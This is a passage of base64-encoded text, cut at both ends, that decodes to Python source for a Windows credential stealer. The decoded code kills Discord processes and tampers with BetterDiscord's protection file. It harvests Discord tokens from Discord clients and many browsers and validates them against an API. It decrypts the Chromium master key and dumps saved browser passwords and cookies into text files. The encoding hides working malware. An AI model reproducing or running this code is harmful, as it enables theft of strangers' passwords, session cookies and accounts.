CJkaXNjb3JkZGV2ZWxvcG1lbnQiLAogICAgICAgICAgICAiZGlzY29yZHB0YiIsCiAgICAgICAgXToKICAgICAgICAgICAgYmxsaXN0LmFwcGVuZChpKQogICAgICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKToKICAgICAgICAgICAgaWYgYW55KHByb2NzdHIgaW4gcHJvYy5uYW1lKCkubG93ZXIoKSBmb3IgcHJvY3N0ciBpbiBibGxpc3QpOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHByb2Mua2lsbCgpCiAgICAgICAgICAgICAgICBleGNlcHQgKHBzdXRpbC5Ob1N1Y2hQcm9jZXNzLCBwc3V0aWwuQWNjZXNzRGVuaWVkKToKICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgYXN5bmMgZGVmIGJ5cGFzc19idHRkc2Moc2VsZik6CiAgICAgICAgYmQgPSBzZWxmLnJvYW1pbmcgKyAiXFxCZXR0ZXJEaXNjb3JkXFxkYXRhXFxiZXR0ZXJkaXNjb3JkLmFzYXIiCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhiZCk6CiAgICAgICAgICAgIHggPSBzZWxmLnJlZ2V4X3dlYmhvb2tfZHNjCiAgICAgICAgICAgIHdpdGggb3BlbihiZCwgInIiLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGY6CiAgICAgICAgICAgICAgICB0eHQgPSBmLnJlYWQoKQogICAgICAgICAgICAgICAgY29udGVudCA9IHR4dC5yZXBsYWNlKHgsICJLU0NIaXNoZXJlIikKICAgICAgICAgICAgd2l0aCBvcGVuKGJkLCAidyIsIG5ld2xpbmU9IiIsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0iaWdub3JlIikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoY29udGVudCkKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiB2YWx1ZV9kY3J5cHQoc2VsZiwgYnVmZiwgbWFzdGVyX2tleSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICByZXR1cm4gIkZhaWxlZCB0byBkZWNyeXB0IHBhc3N3b3JkIgoKICAgIGRlZiBNYXN0ZXJLZXlfZmluZChzZWxmLCBwYXRoKToKICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBjID0gZi5yZWFkKCkKICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZHMoYykKICAgICAgICBtYXN0ZXJfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgICAgIG1hc3Rlcl9rZXkgPSBtYXN0ZXJfa2V5WzU6XQogICAgICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KICAgICAgICByZXR1cm4gbWFzdGVyX2tleQoKICAgIGRlZiBmaW5kX2JjdG9rZW4oc2VsZik6CiAgICAgICAgcGF0aHMgPSB7CiAgICAgICAgICAgICJEaXNjb3JkIjogc2VsZi5yb2FtaW5nICsgIlxcZGlzY29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkRpc2NvcmQgQ2FuYXJ5Ijogc2VsZi5yb2FtaW5nCiAgICAgICAgICAgICsgIlxcZGlzY29yZGNhbmFyeVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkxpZ2h0Y29yZCI6IHNlbGYucm9hbWluZyArICJcXExpZ2h0Y29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkRpc2NvcmQgUFRCIjogc2VsZi5yb2FtaW5nICsgIlxcZGlzY29yZHB0YlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIk9wZXJhIjogc2VsZi5yb2FtaW5nCiAgICAgICAgICAgICsgIlxcT3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIk9wZXJhIEdYIjogc2VsZi5yb2FtaW5nCiAgICAgICAgICAgICsgIlxcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkFtaWdvIjogc2VsZi5hcHBkYXRhICsgIlxcQW1pZ29cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIlRvcmNoIjogc2VsZi5hcHBkYXRhICsgIlxcVG9yY2hcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIktvbWV0YSI6IHNlbGYuYXBwZGF0YSArICJcXEtvbWV0YVxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiLAogICAgICAgICAgICAiT3JiaXR1bSI6IHNlbGYuYXBwZGF0YSArICJcXE9yYml0dW1cXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkNlbnRCcm93c2VyIjogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIjdTdGFyIjogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcN1N0YXJcXDdTdGFyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCIsCiAgICAgICAgICAgICJTcHV0bmlrIjogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcU3B1dG5pa1xcU3B1dG5pa1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiLAogICAgICAgICAgICAiVml2YWxkaSI6IHNlbGYuYXBwZGF0YQogICAgICAgICAgICArICJcXFZpdmFsZGlcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkNocm9tZSBTeFMiOiBzZWxmLmFwcGRhdGEKICAgICAgICAgICAgKyAiXFxHb29nbGVcXENocm9tZSBTeFNcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkNocm9tZSI6IHNlbGYuYXBwZGF0YQogICAgICAgICAgICArICJcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCIsCiAgICAgICAgICAgICJDaHJvbWUxIjogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSAxXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiLAogICAgICAgICAgICAiQ2hyb21lMiI6IHNlbGYuYXBwZGF0YQogICAgICAgICAgICArICJcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgMlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkNocm9tZTMiOiBzZWxmLmFwcGRhdGEKICAgICAgICAgICAgKyAiXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxQcm9maWxlIDNcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCIsCiAgICAgICAgICAgICJDaHJvbWU0Ijogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcUHJvZmlsZSA0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiLAogICAgICAgICAgICAiQ2hyb21lNSI6IHNlbGYuYXBwZGF0YQogICAgICAgICAgICArICJcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXFByb2ZpbGUgNVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIkVwaWMgUHJpdmFjeSBCcm93c2VyIjogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcRXBpYyBQcml2YWN5IEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIk1pY3Jvc29mdCBFZGdlIjogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGFcXERlZmF1bFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIlVyYW4iOiBzZWxmLmFwcGRhdGEKICAgICAgICAgICAgKyAiXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcIiwKICAgICAgICAgICAgIllhbmRleCI6IHNlbGYuYXBwZGF0YQogICAgICAgICAgICArICJcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiLAogICAgICAgICAgICAiQnJhdmUiOiBzZWxmLmFwcGRhdGEKICAgICAgICAgICAgKyAiXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCIsCiAgICAgICAgICAgICJJcmlkaXVtIjogc2VsZi5hcHBkYXRhCiAgICAgICAgICAgICsgIlxcSXJpZGl1bVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwiLAogICAgICAgIH0KCiAgICAgICAgZm9yIG5hbWUsIHBhdGggaW4gcGF0aHMuaXRlbXMoKToKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZGlzYyA9IG5hbWUucmVwbGFjZSgiICIsICIiKS5sb3dlcigpCiAgICAgICAgICAgIGlmICJjb3JkIiBpbiBwYXRoOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc2VsZi5yb2FtaW5nICsgZiJcXHtkaXNjfVxcTG9jYWwgU3RhdGUiKToKICAgICAgICAgICAgICAgICAgICBmb3IgZmlsbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxuYW1lWy0zOl0gbm90IGluIFsibG9nIiwgImxkYiJdOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgeC5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBvcGVuKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYie3BhdGh9XFx7ZmlsbmFtZX0iLCBlcnJvcnM9Imlnbm9yZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICkucmVhZGxpbmVzKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHguc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBdOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHkgaW4gcmUuZmluZGFsbChzZWxmLmVuY3J5cHRlZF9yZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IHNlbGYudmFsdWVfZGNyeXB0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFzZTY0LmI2NGRlY29kZSh5LnNwbGl0KCJkUXc0dzlXZ1hjUToiKVsxXSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLk1hc3RlcktleV9maW5kKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucm9hbWluZyArIGYiXFx7ZGlzY31cXExvY2FsIFN0YXRlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iYXNldXJsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVycz17CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xNDkgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gci5qc29uKClbImlkIl0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLmJjX2lkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iY19pZC5hcHBlbmQodWlkKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZm9yIGZpbG5hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICBpZiBmaWxuYW1lWy0zOl0gbm90IGluIFsibG9nIiwgImxkYiJdOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFsKICAgICAgICAgICAgICAgICAgICAgICAgeC5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxuYW1lfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgeC5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgXToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwoc2VsZi5yZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iYXNldXJsLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzPXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuMTQ5IFNhZmFyaS81MzcuMzYiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1aWQgPSByLmpzb24oKVsiaWQiXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVpZCBub3QgaW4gc2VsZi5iY19pZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmJjX2lkLmFwcGVuZCh1aWQpCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc2VsZi5yb2FtaW5nICsgIlxcTW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXMiKToKICAgICAgICAgICAgZm9yIHBhdGgsIF8sIGZpbGVzIGluIG9zLndhbGsoCiAgICAgICAgICAgICAgICBzZWxmLnJvYW1pbmcgKyAiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIKICAgICAgICAgICAgKToKICAgICAgICAgICAgICAgIGZvciBfZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX2ZpbGUuZW5kc3dpdGgoIi5zcWxpdGUiKToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbCiAgICAgICAgICAgICAgICAgICAgICAgIHguc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7X2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKQogICAgICAgICAgICAgICAgICAgICAgICBpZiB4LnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBdOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChzZWxmLnJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmJhc2V1cmwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9ewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xNDkgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0b2tlbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpZCA9IHIuanNvbigpWyJpZCJdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdWlkIG5vdCBpbiBzZWxmLmJjX2lkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYmNfaWQuYXBwZW5kKHVpZCkKCiAgICBkZWYgcmFuZG9tX2Rpcl9jcmVhdGUoc2VsZiwgX2Rpcjogc3RyIG9yIG9zLlBhdGhMaWtlID0gZ2V0dGVtcGRpcigpKToKICAgICAgICBmaWxuYW1lID0gIiIuam9pbigKICAgICAgICAgICAgcmFuZG9tLlN5c3RlbVJhbmRvbSgpLmNob2ljZSgKICAgICAgICAgICAgICAgICJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OSIKICAgICAgICAgICAgKQogICAgICAgICAgICBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMjApKQogICAgICAgICkKICAgICAgICBwYXRoID0gb3MucGF0aC5qb2luKF9kaXIsIGZpbG5hbWUpCiAgICAgICAgb3BlbihwYXRoLCAieCIpCiAgICAgICAgcmV0dXJuIHBhdGgKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBzdGVhbF9wYXNzd29yZHMyKHNlbGYsIG5hbWU6IHN0ciwgcGF0aDogc3RyLCBwcm9maWxlOiBzdHIpOgogICAgICAgIHBhdGggKz0gIlxcIiArIHByb2ZpbGUgKyAiXFxMb2dpbiBEYXRhIgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgbG9naW52YXVsdCA9IHNlbGYucmFuZG9tX2Rpcl9jcmVhdGUoKQogICAgICAgIGNvcHkyKHBhdGgsIGxvZ2ludmF1bHQpCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbnZhdWx0KQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4oCiAgICAgICAgICAgIG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkJyb3dzZXJzIFBhc3N3b3Jkcy50eHQiKSwKICAgICAgICAgICAgImEiLAogICAgICAgICAgICBlbmNvZGluZz0idXRmLTgiLAogICAgICAgICkgYXMgZjoKICAgICAgICAgICAgZm9yIHJlcyBpbiBjdXJzb3IuZXhlY3V0ZSgKICAgICAgICAgICAgICAgICJTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIgogICAgICAgICAgICApLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICB1cmwsIHVzZXJuYW1lLCBwYXNzd29yZCA9IHJlcwogICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBzZWxmLnZhbHVlX2RlY3J5cHQocGFzc3dvcmQsIHNlbGYubWFzdGVya2V5KQogICAgICAgICAgICAgICAgaWYgdXJsICE9ICIiOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJVUkw6IHt1cmx9XG5JRDoge3VzZXJuYW1lfVxuUEFTU1cwUkQ6IHtwYXNzd29yZH1cblxuIikKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShsb2dpbnZhdWx0KQoKICAgIEBleHRyYWN0X3RyeQogICAgZGVmIHN0ZWFsX2Nvb2tpZXMyKHNlbGYsIG5hbWU6IHN0ciwgcGF0aDogc3RyLCBwcm9maWxlOiBzdHIpOgogICAgICAgIHBhdGggKz0gIlxcIiArIHByb2ZpbGUgKyAiXFxOZXR3b3JrXFxDb29raWVzIgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgY29va2lldmF1bHQgPSBzZWxmLnJhbmRvbV9kaXJfY3JlYXRlKCkKICAgICAgICBjb3B5MihwYXRoLCBjb29raWV2YXVsdCkKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KGNvb2tpZXZhdWx0KQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB3aXRoIG9wZW4oCiAgICAgICAgICAgIG9zLnBhdGguam9pbihzZWxmLmRpciwgIkJyb3dzZXJzIiwgIkJyb3dzZXJzIENvb2tpZXMudHh0IiksCiAgICAgICAgICAgICJhIiwKICAgICAgICAgICAgZW5jb2Rpbmc9InV0Zi04IiwKICAgICAgICApIGFzIGY6CiAgICAgICAgICAgIGZvciByZXMgaW4gY3Vyc29yLmV4ZWN1dGUoCiAgICAgICAgICAgICAgICAiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBwYXRoLCBlbmNyeXB0ZWRfdmFsdWUsZXhwaXJlc191dGMgRlJPTSBjb29raWVzIgogICAgICAgICAgICApLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICBob3N0X2tleSwgbmFtZSwgcGF0aCwgZW5jcnlwdGVkX3ZhbHVlLCBleHBpcmVzX3V0YyA9IHJlcwogICAgICAgICAgICAgICAgdmFsdWUgPSBzZWxmLnZhbHVlX2RlY3J5cHQoZW5jcnlwdGVkX3ZhbHVlLCBzZWxmLm1hc3RlcmtleSkKICAgICAgICAgICAgICAgIGlmIGhvc3Rfa2V5IGFuZCBuYW1lIGFuZCB2YWx1ZSAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKAogICAgICAgICAgICAgICAgICAgICAgICAie31cdHt9XHR7fVx0e31cdHt9XHR7fVx0e31cbiIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaG9zdF9rZXksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRkFMU0UiIGlmIGV4cGlyZXNfdXRjID09IDAgZWxzZSAiVFJVRSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkZBTFNFIiBpZiBob3N0X2tleS5zdGFydHN3aXRoKCIuIikgZWxzZSAiVFJVRSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHBpcmVzX3V0YywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShjb29raWV2YXVsdCkKCiAgICBAZXh0cmFjdF90cnkKICAgIGRlZiBzdGVhbF9wYXNzd29yZHMoc2VsZik6CiAgICAgICAgZiA9IG9wZW4oCiAgICAgICAgICAgIG50cGF0aC5qb2luKHNlbGYuZGlyLCAiR29vZ2xlIiwgIlBhc3N3b3Jkcy50eHQiKSwKICAgICAgICAgICAgInciLAogICAgICAgICAgICBlbmNvZGluZz0iY3A0MzciLAogICAgICAgICAgICBlcnJvcnM9Imlnbm9yZSIsCiAgICAgICAgKQogICAgICAgIGZvciBwcm9mIGluIG9zLmxpc3RkaXIoc2VsZi5jaHJtbXVzZXJkdHQpOgogICAgICAgICAgIC